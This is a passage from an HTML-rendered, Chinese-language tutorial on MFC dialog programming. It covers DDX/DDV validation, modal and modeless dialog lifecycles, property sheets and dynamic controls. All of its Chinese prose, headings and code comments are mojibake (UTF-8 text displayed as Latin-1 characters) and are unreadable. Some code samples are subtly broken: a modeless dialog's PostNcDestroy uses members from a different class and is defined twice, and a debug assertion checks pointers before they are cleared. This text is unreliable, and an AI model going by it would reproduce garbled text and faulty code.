<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è‡ªå®šä¹‰DDVéªŒè¯å®</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> DDV_Email(pDX, value) \
    do { \
        <span class="hljs-keyword">if</span> ((pDX)-&gt;m_bSaveAndValidate) { \
            <span class="hljs-keyword">if</span> (!IsValidEmail(value)) { \
                AfxMessageBox(_T(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„ç”µå­é‚®ä»¶åœ°å€"</span>), \
                             MB_ICONEXCLAMATION); \
                (pDX)-&gt;Fail(); \
            } \
        } \
    } while (0)</span>

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰éªŒè¯</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
    
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_EMAIL, m_strEmail);
    <span class="hljs-built_in">DDV_Email</span>(pDX, m_strEmail);  <span class="hljs-comment">// è‡ªå®šä¹‰éªŒè¯</span>
}

<span class="hljs-comment">// ç”µå­é‚®ä»¶éªŒè¯å‡½æ•°</span>
<span class="hljs-function">BOOL <span class="hljs-title">CMyDialog::IsValidEmail</span><span class="hljs-params">(<span class="hljs-type">const</span> CString&amp; strEmail)</span>
</span>{
    <span class="hljs-comment">// ç®€å•çš„ç”µå­é‚®ä»¶éªŒè¯é€»è¾‘</span>
    <span class="hljs-type">int</span> nAtPos = strEmail.<span class="hljs-built_in">Find</span>(<span class="hljs-string">'@'</span>);
    <span class="hljs-type">int</span> nDotPos = strEmail.<span class="hljs-built_in">Find</span>(<span class="hljs-string">'.'</span>, nAtPos);
    
    <span class="hljs-keyword">return</span> (nAtPos &gt; <span class="hljs-number">0</span> &amp;&amp; nDotPos &gt; nAtPos + <span class="hljs-number">1</span> &amp;&amp; 
            nDotPos &lt; strEmail.<span class="hljs-built_in">GetLength</span>() - <span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-47">äº”ã€æ¨¡æ€ä¸éæ¨¡æ€å¯¹è¯æ¡†çš„æ·±å…¥å¯¹æ¯”</h3>
<h4 data-id="heading-48">5.1 æ¨¡æ€å¯¹è¯æ¡†çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ¨¡æ€å¯¹è¯æ¡†çš„åˆ›å»ºä¸ä½¿ç”¨</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnOpenSettings</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-function">CMyDialog <span class="hljs-title">dlg</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>;  <span class="hljs-comment">// åˆ›å»ºå¯¹è¯æ¡†å¯¹è±¡</span>
    
    <span class="hljs-comment">// è®¾ç½®åˆå§‹å€¼</span>
    dlg.m_strName = m_strCurrentName;
    dlg.m_nAge = m_nCurrentAge;
    
    <span class="hljs-comment">// æ˜¾ç¤ºæ¨¡æ€å¯¹è¯æ¡†</span>
    <span class="hljs-keyword">if</span> (dlg.<span class="hljs-built_in">DoModal</span>() == IDOK)
    {
        <span class="hljs-comment">// ç”¨æˆ·ç‚¹å‡»äº†ç¡®å®š</span>
        m_strCurrentName = dlg.m_strName;
        m_nCurrentAge = dlg.m_nAge;
        
        <span class="hljs-comment">// ä¿å­˜è®¾ç½®</span>
        <span class="hljs-built_in">SaveSettings</span>();
        
        <span class="hljs-comment">// æ›´æ–°æ˜¾ç¤º</span>
        <span class="hljs-built_in">UpdateDisplay</span>();
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-comment">// ç”¨æˆ·ç‚¹å‡»äº†å–æ¶ˆ</span>
        <span class="hljs-built_in">AfxMessageBox</span>(_T(<span class="hljs-string">"è®¾ç½®æœªä¿å­˜"</span>));
    }
    
    <span class="hljs-comment">// å¯¹è¯æ¡†å¯¹è±¡è‡ªåŠ¨é”€æ¯</span>
}
</code></pre>
<h4 data-id="heading-49">5.2 éæ¨¡æ€å¯¹è¯æ¡†çš„ç‰¹æ®Šç®¡ç†</h4>
<p>éæ¨¡æ€å¯¹è¯æ¡†éœ€è¦ä¸åŒçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// éæ¨¡æ€å¯¹è¯æ¡†çš„åˆ›å»ºä¸ç®¡ç†</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyView</span> : <span class="hljs-keyword">public</span> CView
{
<span class="hljs-keyword">private</span>:
    CMyModelessDialog* m_pModelessDlg;  <span class="hljs-comment">// æŒ‡é’ˆæˆå‘˜</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OnOpenModelessDialog</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// é˜²æ­¢é‡å¤æ‰“å¼€</span>
        <span class="hljs-keyword">if</span> (m_pModelessDlg != <span class="hljs-literal">NULL</span> &amp;&amp; m_pModelessDlg-&gt;<span class="hljs-built_in">GetSafeHwnd</span>() != <span class="hljs-literal">NULL</span>)
        {
            m_pModelessDlg-&gt;<span class="hljs-built_in">SetActiveWindow</span>();
            m_pModelessDlg-&gt;<span class="hljs-built_in">ShowWindow</span>(SW_SHOW);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// åˆ›å»ºéæ¨¡æ€å¯¹è¯æ¡†</span>
        m_pModelessDlg = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CMyModelessDialog</span>(<span class="hljs-keyword">this</span>);
        
        <span class="hljs-comment">// å¿…é¡»æŒ‡å®šWS_VISIBLEé£æ ¼</span>
        <span class="hljs-keyword">if</span> (!m_pModelessDlg-&gt;<span class="hljs-built_in">Create</span>(IDD_MYDIALOG, <span class="hljs-keyword">this</span>))
        {
            <span class="hljs-keyword">delete</span> m_pModelessDlg;
            m_pModelessDlg = <span class="hljs-literal">NULL</span>;
            <span class="hljs-built_in">AfxMessageBox</span>(_T(<span class="hljs-string">"åˆ›å»ºå¯¹è¯æ¡†å¤±è´¥"</span>));
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// æ˜¾ç¤ºå¯¹è¯æ¡†</span>
        m_pModelessDlg-&gt;<span class="hljs-built_in">ShowWindow</span>(SW_SHOW);
    }
    
    <span class="hljs-comment">// å¯¹è¯æ¡†å…³é—­æ—¶çš„æ¸…ç†</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OnModelessDialogClosed</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">if</span> (m_pModelessDlg != <span class="hljs-literal">NULL</span>)
        {
            <span class="hljs-comment">// æ³¨æ„ï¼šä¸èƒ½è°ƒç”¨deleteï¼Œå¯¹è¯æ¡†è‡ªå·±ç®¡ç†ç”Ÿå‘½å‘¨æœŸ</span>
            m_pModelessDlg = <span class="hljs-literal">NULL</span>;
        }
    }
};

<span class="hljs-comment">// éæ¨¡æ€å¯¹è¯æ¡†ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyModelessDialog</span> : <span class="hljs-keyword">public</span> CDialogEx
{
<span class="hljs-keyword">private</span>:
    CMyView* m_pParentView;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CMyModelessDialog</span>(CMyView* pParent) 
        : <span class="hljs-built_in">CDialogEx</span>(IDD_MYDIALOG, pParent), <span class="hljs-built_in">m_pParentView</span>(pParent) {}
    
    <span class="hljs-comment">// é‡å†™OnOKå’ŒOnCancel</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnOK</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">UpdateData</span>(TRUE))
            <span class="hljs-keyword">return</span>;
        
        <span class="hljs-comment">// é€šçŸ¥çˆ¶è§†å›¾</span>
        <span class="hljs-keyword">if</span> (m_pParentView != <span class="hljs-literal">NULL</span>)
        {
            m_pParentView-&gt;<span class="hljs-built_in">ApplyDialogSettings</span>(m_strName, m_nAge);
        }
        
        <span class="hljs-comment">// ä¸è°ƒç”¨åŸºç±»OnOKï¼ˆä¸å…³é—­å¯¹è¯æ¡†ï¼‰</span>
        <span class="hljs-comment">// è€Œæ˜¯éšè—æˆ–æ‰§è¡Œå…¶ä»–æ“ä½œ</span>
        <span class="hljs-built_in">ShowWindow</span>(SW_HIDE);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnCancel</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-comment">// é€šçŸ¥çˆ¶è§†å›¾å¯¹è¯æ¡†å·²å…³é—­</span>
        <span class="hljs-keyword">if</span> (m_pParentView != <span class="hljs-literal">NULL</span>)
        {
            m_pParentView-&gt;<span class="hljs-built_in">OnModelessDialogClosed</span>();
        }
        
        <span class="hljs-comment">// é”€æ¯çª—å£</span>
        <span class="hljs-built_in">DestroyWindow</span>();
    }
    
    <span class="hljs-comment">// é‡å†™PostNcDestroyä»¥åˆ é™¤å¯¹è±¡</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">PostNcDestroy</span><span class="hljs-params">()</span>
    </span>{
        CDialogEx::<span class="hljs-built_in">PostNcDestroy</span>();
        <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>;  <span class="hljs-comment">// è‡ªæˆ‘åˆ é™¤</span>
    }
    
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
};
</code></pre>
<h3 data-id="heading-50">å…­ã€å±æ€§è¡¨ï¼ˆProperty Sheetï¼‰ä¸å±æ€§é¡µï¼ˆProperty Pageï¼‰</h3>
<p>å¯¹äºå¤æ‚çš„è®¾ç½®å¯¹è¯æ¡†ï¼ŒMFCæä¾›äº†å±æ€§è¡¨æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å±æ€§é¡µåŸºç±»çš„ä½¿ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CGeneralPage</span> : <span class="hljs-keyword">public</span> CPropertyPage
{
    <span class="hljs-built_in">DECLARE_DYNCREATE</span>(CGeneralPage)
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CGeneralPage</span>() : <span class="hljs-built_in">CPropertyPage</span>(IDD_GENERAL_PAGE)
    {
        m_psp.dwFlags |= PSP_USETITLE;
        m_psp.pszTitle = _T(<span class="hljs-string">"å¸¸è§„è®¾ç½®"</span>);
    }
    
    <span class="hljs-comment">// æ•°æ®æˆå‘˜</span>
    CString m_strUserName;
    CString m_strCompany;
    BOOL m_bAutoSave;
    
<span class="hljs-keyword">protected</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
    </span>{
        CPropertyPage::<span class="hljs-built_in">DoDataExchange</span>(pDX);
        <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_USERNAME, m_strUserName);
        <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_COMPANY, m_strCompany);
        <span class="hljs-built_in">DDX_Check</span>(pDX, IDC_CHECK_AUTOSAVE, m_bAutoSave);
    }
    
    <span class="hljs-comment">// éªŒè¯</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">OnApply</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">UpdateData</span>(TRUE))
            <span class="hljs-keyword">return</span> FALSE;
            
        <span class="hljs-comment">// åº”ç”¨è®¾ç½®</span>
        <span class="hljs-built_in">AfxGetApp</span>()-&gt;<span class="hljs-built_in">WriteProfileString</span>(_T(<span class="hljs-string">"Settings"</span>), _T(<span class="hljs-string">"UserName"</span>), m_strUserName);
        
        <span class="hljs-keyword">return</span> CPropertyPage::<span class="hljs-built_in">OnApply</span>();
    }
};

<span class="hljs-comment">// å±æ€§è¡¨çš„åˆ›å»ºä¸ä½¿ç”¨</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyApp::OnSettings</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// åˆ›å»ºå±æ€§è¡¨</span>
    <span class="hljs-function">CPropertySheet <span class="hljs-title">sheet</span><span class="hljs-params">(_T(<span class="hljs-string">"åº”ç”¨ç¨‹åºè®¾ç½®"</span>))</span></span>;
    
    <span class="hljs-comment">// æ·»åŠ å±æ€§é¡µ</span>
    CGeneralPage pageGeneral;
    CAdvancedPage pageAdvanced;
    
    sheet.<span class="hljs-built_in">AddPage</span>(&amp;pageGeneral);
    sheet.<span class="hljs-built_in">AddPage</span>(&amp;pageAdvanced);
    
    <span class="hljs-comment">// è®¾ç½®åˆå§‹å€¼</span>
    pageGeneral.m_strUserName = <span class="hljs-built_in">GetCurrentUserName</span>();
    pageAdvanced.m_nTimeout = <span class="hljs-built_in">GetTimeoutValue</span>();
    
    <span class="hljs-comment">// æ˜¾ç¤ºæ¨¡æ€å±æ€§è¡¨</span>
    <span class="hljs-keyword">if</span> (sheet.<span class="hljs-built_in">DoModal</span>() == IDOK)
    {
        <span class="hljs-comment">// ä¿å­˜æ‰€æœ‰è®¾ç½®</span>
        <span class="hljs-built_in">SaveSettings</span>(pageGeneral, pageAdvanced);
    }
}
</code></pre>
<h3 data-id="heading-51">ä¸ƒã€å¯¹è¯æ¡†æ•°æ®äº¤æ¢çš„é«˜çº§æŠ€å·§</h3>
<h4 data-id="heading-52">7.1 åŠ¨æ€æ§ä»¶çš„æ•°æ®äº¤æ¢</h4>
<p>å¯¹äºåŠ¨æ€åˆ›å»ºçš„æ§ä»¶ï¼Œéœ€è¦ç‰¹æ®Šå¤„ç†DDXï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CDynamicDialog</span> : <span class="hljs-keyword">public</span> CDialogEx
{
<span class="hljs-keyword">private</span>:
    <span class="hljs-comment">// åŠ¨æ€æ§ä»¶IDèµ·å§‹å€¼ï¼ˆå¿…é¡»å¤§äºç³»ç»ŸIDï¼‰</span>
    <span class="hljs-keyword">enum</span> { IDC_DYNAMIC_START = <span class="hljs-number">0x8000</span> };
    
    <span class="hljs-comment">// åŠ¨æ€æ§ä»¶æ•°ç»„</span>
    CEdit* m_pDynamicEdits[<span class="hljs-number">10</span>];
    CStatic* m_pDynamicLabels[<span class="hljs-number">10</span>];
    <span class="hljs-type">int</span> m_nDynamicValues[<span class="hljs-number">10</span>];
    <span class="hljs-type">int</span> m_nControlCount;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
    </span>{
        CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
        
        <span class="hljs-comment">// åŠ¨æ€æ§ä»¶çš„DDX</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m_nControlCount; i++)
        {
            <span class="hljs-keyword">if</span> (m_pDynamicEdits[i] != <span class="hljs-literal">NULL</span> &amp;&amp; m_pDynamicEdits[i]-&gt;<span class="hljs-built_in">GetSafeHwnd</span>() != <span class="hljs-literal">NULL</span>)
            {
                <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_DYNAMIC_START + i, m_nDynamicValues[i]);
            }
        }
    }
    
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateDynamicControls</span><span class="hljs-params">(<span class="hljs-type">int</span> nCount)</span>
    </span>{
        m_nControlCount = nCount;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nCount; i++)
        {
            <span class="hljs-comment">// åˆ›å»ºæ ‡ç­¾</span>
            m_pDynamicLabels[i] = <span class="hljs-keyword">new</span> CStatic;
            m_pDynamicLabels[i]-&gt;<span class="hljs-built_in">Create</span>(_T(<span class="hljs-string">"åŠ¨æ€æ§ä»¶ "</span>) + <span class="hljs-built_in">CString</span>(<span class="hljs-built_in">char</span>(<span class="hljs-string">'A'</span> + i)),
                                       WS_CHILD | WS_VISIBLE,
                                       <span class="hljs-built_in">CRect</span>(<span class="hljs-number">10</span>, <span class="hljs-number">30</span> + i * <span class="hljs-number">30</span>, <span class="hljs-number">100</span>, <span class="hljs-number">50</span> + i * <span class="hljs-number">30</span>),
                                       <span class="hljs-keyword">this</span>);
            
            <span class="hljs-comment">// åˆ›å»ºç¼–è¾‘æ¡†</span>
            m_pDynamicEdits[i] = <span class="hljs-keyword">new</span> CEdit;
            m_pDynamicEdits[i]-&gt;<span class="hljs-built_in">Create</span>(WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                                      <span class="hljs-built_in">CRect</span>(<span class="hljs-number">110</span>, <span class="hljs-number">30</span> + i * <span class="hljs-number">30</span>, <span class="hljs-number">210</span>, <span class="hljs-number">50</span> + i * <span class="hljs-number">30</span>),
                                      <span class="hljs-keyword">this</span>, IDC_DYNAMIC_START + i);
        }
    }
};
</code></pre>
<h4 data-id="heading-53">7.2 æ•°æ®äº¤æ¢çš„æ€§èƒ½ä¼˜åŒ–</h4>
<p>å¯¹äºåŒ…å«å¤§é‡æ§ä»¶çš„å¯¹è¯æ¡†ï¼Œå¯ä»¥ä¼˜åŒ–DDXæ€§èƒ½ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">COptimizedDialog::DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
    
    <span class="hljs-comment">// ä½¿ç”¨æ¡ä»¶ç¼–è¯‘æˆ–æ ‡å¿—æ§åˆ¶DDXèŒƒå›´</span>
    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FULL_DATA_EXCHANGE</span>
    <span class="hljs-comment">// å®Œæ•´çš„æ•°æ®äº¤æ¢</span>
    <span class="hljs-built_in">ExchangeAllData</span>(pDX);
    <span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
    <span class="hljs-comment">// éƒ¨åˆ†æ•°æ®äº¤æ¢ï¼ˆæ ¹æ®éœ€æ±‚ï¼‰</span>
    <span class="hljs-keyword">if</span> (pDX-&gt;m_bSaveAndValidate)
    {
        <span class="hljs-comment">// åªéªŒè¯å¿…è¦å­—æ®µ</span>
        <span class="hljs-built_in">ExchangeRequiredData</span>(pDX);
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-comment">// åªæ›´æ–°å¯è§å­—æ®µ</span>
        <span class="hljs-built_in">ExchangeVisibleData</span>(pDX);
    }
    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}

<span class="hljs-comment">// åˆ†ç»„æ•°æ®äº¤æ¢ç¤ºä¾‹</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">COptimizedDialog::ExchangePersonalData</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_NAME, m_strName);
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_AGE, m_nAge);
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_PHONE, m_strPhone);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">COptimizedDialog::ExchangeWorkData</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_COMPANY, m_strCompany);
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_POSITION, m_strPosition);
}
</code></pre>
<h3 data-id="heading-54">å…«ã€å¯¹è¯æ¡†ä¸æ–‡æ¡£/è§†å›¾æ¶æ„çš„é›†æˆ</h3>
<p>å¯¹è¯æ¡†å¯ä»¥ä½œä¸ºæ–‡æ¡£/è§†å›¾æ¶æ„çš„è¡¥å……ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åœ¨æ–‡æ¡£/è§†å›¾åº”ç”¨ä¸­ä½¿ç”¨å¯¹è¯æ¡†</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnEditPreferences</span><span class="hljs-params">()</span>
</span>{
    CPreferencesDialog dlg;
    
    <span class="hljs-comment">// ä»æ–‡æ¡£è·å–å½“å‰è®¾ç½®</span>
    CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
    dlg.m_strDefaultPath = pDoc-&gt;<span class="hljs-built_in">GetDefaultPath</span>();
    dlg.m_nAutoSaveInterval = pDoc-&gt;<span class="hljs-built_in">GetAutoSaveInterval</span>();
    
    <span class="hljs-keyword">if</span> (dlg.<span class="hljs-built_in">DoModal</span>() == IDOK)
    {
        <span class="hljs-comment">// æ›´æ–°æ–‡æ¡£è®¾ç½®</span>
        pDoc-&gt;<span class="hljs-built_in">SetDefaultPath</span>(dlg.m_strDefaultPath);
        pDoc-&gt;<span class="hljs-built_in">SetAutoSaveInterval</span>(dlg.m_nAutoSaveInterval);
        
        <span class="hljs-comment">// æ ‡è®°æ–‡æ¡£ä¸ºå·²ä¿®æ”¹</span>
        pDoc-&gt;<span class="hljs-built_in">SetModifiedFlag</span>(TRUE);
        
        <span class="hljs-comment">// æ›´æ–°æ‰€æœ‰è§†å›¾</span>
        pDoc-&gt;<span class="hljs-built_in">UpdateAllViews</span>(<span class="hljs-keyword">this</span>);
    }
}

<span class="hljs-comment">// å¯¹è¯æ¡†æ•°æ®å˜åŒ–å®æ—¶æ›´æ–°è§†å›¾</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CRealTimeDialog::OnChangeEditValue</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// è·å–å½“å‰å€¼</span>
    <span class="hljs-built_in">UpdateData</span>(TRUE);
    
    <span class="hljs-comment">// å®æ—¶æ›´æ–°é¢„è§ˆ</span>
    CPreviewDialog* pPreview = <span class="hljs-built_in">GetPreviewWindow</span>();
    <span class="hljs-keyword">if</span> (pPreview != <span class="hljs-literal">NULL</span>)
    {
        pPreview-&gt;<span class="hljs-built_in">UpdatePreview</span>(m_nValue, m_strText);
    }
}
</code></pre>
<h3 data-id="heading-55">ä¹ã€å¸¸è§é—®é¢˜ä¸è°ƒè¯•æŠ€å·§</h3>
<h4 data-id="heading-56">9.1 DDX/DDVå¸¸è§é—®é¢˜æ’æŸ¥</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è°ƒè¯•DDXé—®é¢˜çš„æŠ€å·§</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::DoDataExchange</span><span class="hljs-params">(CDataExchange* pDX)</span>
</span>{
    <span class="hljs-built_in">TRACE</span>(_T(<span class="hljs-string">"DoDataExchange called, m_bSaveAndValidate = %d\n"</span>), 
          pDX-&gt;m_bSaveAndValidate);
    
    CDialogEx::<span class="hljs-built_in">DoDataExchange</span>(pDX);
    
    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span>
    <span class="hljs-comment">// è°ƒè¯•æ¨¡å¼ä¸‹æ·»åŠ é¢å¤–æ£€æŸ¥</span>
    <span class="hljs-keyword">if</span> (pDX-&gt;m_bSaveAndValidate)
    {
        <span class="hljs-comment">// æ£€æŸ¥æ§ä»¶æ˜¯å¦å­˜åœ¨</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetDlgItem</span>(IDC_EDIT_NAME) == <span class="hljs-literal">NULL</span>)
        {
            <span class="hljs-built_in">TRACE0</span>(<span class="hljs-string">"é”™è¯¯: IDC_EDIT_NAME æ§ä»¶ä¸å­˜åœ¨!\n"</span>);
            <span class="hljs-built_in">ASSERT</span>(FALSE);
        }
    }
    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
    
    <span class="hljs-built_in">DDX_Text</span>(pDX, IDC_EDIT_NAME, m_strName);
    
    <span class="hljs-built_in">TRACE</span>(_T(<span class="hljs-string">"m_strName = %s\n"</span>), (LPCTSTR)m_strName);
}
</code></pre>
<h4 data-id="heading-57">9.2 å†…å­˜æ³„æ¼æ£€æµ‹</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ£€æµ‹å¯¹è¯æ¡†ç›¸å…³çš„å†…å­˜æ³„æ¼</span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDialog::OnDestroy</span><span class="hljs-params">()</span>
</span>{
    CDialogEx::<span class="hljs-built_in">OnDestroy</span>();
    
    <span class="hljs-comment">// æ£€æŸ¥åŠ¨æ€åˆ›å»ºçš„æ§ä»¶æ˜¯å¦è¢«æ­£ç¡®åˆ é™¤</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m_nControlCount; i++)
    {
        <span class="hljs-comment">// è¿™äº›æŒ‡é’ˆåº”è¯¥åœ¨PostNcDestroyä¸­åˆ é™¤</span>
        <span class="hljs-built_in">ASSERT</span>(m_pDynamicEdits[i] == <span class="hljs-literal">NULL</span>);
    }
}

<span class="hljs-comment">// é‡å†™PostNcDestroyç¡®ä¿èµ„æºæ¸…ç†</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyModelessDialog::PostNcDestroy</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-comment">// æ¸…ç†åŠ¨æ€æ§ä»¶</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m_nControlCount; i++)
    {
        <span class="hljs-keyword">if</span> (m_pDynamicEdits[i] != <span class="hljs-literal">NULL</span>)
        {
            <span class="hljs-keyword">delete</span> m_pDynamicEdits[i];
            m_pDynamicEdits[i] = <span class="hljs-literal">NULL</span>;
        }
    }
    
    CDialogEx::<span class="hljs-built_in">PostNcDestroy</span>();
    <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>;
}
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
</code></pre>
<h3 data-id="heading-58">åã€ç°ä»£æ›¿ä»£æ–¹æ¡ˆä¸æ¶æ„å¯ç¤º</h3>
<p>è™½ç„¶MFCå¯¹è¯æ¡†æœºåˆ¶æœ‰å…¶å†å²å±€é™æ€§ï¼Œä½†å…¶è®¾è®¡æ€æƒ³å¯¹ç°ä»£UIæ¡†æ¶ä»æœ‰å½±å“ï¼š</p>
<ol>
<li><strong>æ•°æ®ç»‘å®šæ¨¡å¼</strong>ï¼šWPF/XAMLçš„æ•°æ®ç»‘å®šæ˜¯DDXçš„è¿›åŒ–ç‰ˆæœ¬</li>
<li><strong>MVVMæ¨¡å¼</strong>ï¼šViewModelä½œä¸ºæ•°æ®ä¸­ä»‹ï¼Œç±»ä¼¼äºMFCå¯¹è¯æ¡†çš„æ•°æ®å±‚</li>
<li><strong>å“åº”å¼è¡¨å•</strong>ï¼šAngular/Reactä¸­çš„è¡¨å•éªŒè¯æœºåˆ¶å€Ÿé‰´äº†DDVçš„æ€æƒ³</li>
</ol>
<p><strong>DDX/DDVæœºåˆ¶çš„ç°ä»£å¯ç¤º</strong>ï¼š</p>
<ul>
<li>å£°æ˜å¼æ•°æ®ç»‘å®šä¼˜äºå‘½ä»¤å¼æ•°æ®æ“ä½œ</li>
<li>æ•°æ®éªŒè¯åº”è¯¥ä¸UIé€»è¾‘åˆ†ç¦»</li>
<li>ç±»å‹å®‰å…¨æ˜¯æ¡†æ¶è®¾è®¡çš„é‡è¦ç›®æ ‡</li>
<li>å¼€å‘è€…ä½“éªŒï¼ˆDXï¼‰ç›´æ¥å½±å“æ¡†æ¶çš„é‡‡ç”¨ç‡</li>
</ul>
<p>MFCçš„å¯¹è¯æ¡†å’ŒDDX/DDVæœºåˆ¶å±•ç¤ºäº†å¦‚ä½•åœ¨C++ç¯å¢ƒä¸­å®ç°ç±»å‹å®‰å…¨çš„UIæ•°æ®ç»‘å®šã€‚è™½ç„¶å…·ä½“å®ç°å·²æ˜¾é™ˆæ—§ï¼Œä½†å…¶æ ¸å¿ƒæ€æƒ³â€”â€”é€šè¿‡å…ƒç¼–ç¨‹ç®€åŒ–å¼€å‘è€…å·¥ä½œã€ç¡®ä¿æ•°æ®å®Œæ•´æ€§ã€æä¾›ä¸€è‡´çš„ç¼–ç¨‹æ¨¡å‹â€”â€”ä»ç„¶æ˜¯ä¼˜ç§€æ¡†æ¶è®¾è®¡çš„é‡è¦åŸåˆ™ã€‚</p>
<h2 data-id="heading-59">ç¬¬å››ç« ï¼šMFCå›¾å½¢è®¾å¤‡æ¥å£(GDI)ç¼–ç¨‹â€”â€”Windowså›¾å½¢æ¸²æŸ“çš„æ ¸å¿ƒå¼•æ“</h2>
<h3 data-id="heading-60">ä¸€ã€GDIç³»ç»Ÿæ¶æ„ï¼šä»ç¡¬ä»¶æŠ½è±¡åˆ°åº”ç”¨ç¨‹åº</h3>
